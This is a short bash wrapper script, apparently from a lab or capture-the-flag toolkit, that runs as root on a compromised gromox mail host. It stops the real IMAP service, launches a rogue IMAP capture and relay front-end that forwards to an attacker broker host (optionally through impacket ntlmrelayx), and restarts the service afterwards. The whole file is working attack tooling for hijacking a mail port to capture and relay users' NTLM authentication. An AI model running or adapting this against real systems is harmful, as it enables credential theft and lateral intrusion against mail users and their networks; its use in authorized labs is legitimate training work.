#!/usr/bin/env bash
# relay_wrapper.sh -- run on the OWNED gromox host (172.16.20.10) as root.
# Frees the IMAP port by stopping gromox-imap, starts the rogue IMAP
# capture/relay front-end, and ALWAYS restarts gromox-imap on exit so the
# mail service is not left offline.
#
# Usage: ./relay_wrapper.sh <broker-ip> [imap-port] [raw-port]
#   raw-port given -> talk impacket ntlmrelayx RAW server on that port (--raw).
#   raw-port omitted -> use the custom JSON broker on 1144.
# Authorized lab / CTF use only.
set -u

BROKER="${1:?usage: $0 <broker-ip> [imap-port] [raw-port]}"
PORT="${2:-143}"
RAWPORT="${3:-}"
RAWARGS=""
if [ -n "${RAWPORT}" ]; then
  RAWARGS="--raw --broker-port ${RAWPORT}"
fi
HERE="$(cd "$(dirname "$0")" && pwd)"
SVC="gromox-imap"

restore() {
  echo "[*] restoring ${SVC}..."
  systemctl start "${SVC}" 2>/dev/null || service "${SVC}" start 2>/dev/null
  echo "[*] ${SVC} restored."
}
trap restore EXIT INT TERM

echo "[*] stopping ${SVC} to free port ${PORT}..."
systemctl stop "${SVC}" 2>/dev/null || service "${SVC}" stop 2>/dev/null
sleep 1

echo "[*] launching rogue IMAP relay front-end (Ctrl-C to stop + restore)"
python3 "${HERE}/imap_capture.py" --broker "${BROKER}" --port "${PORT}" ${RAWARGS}
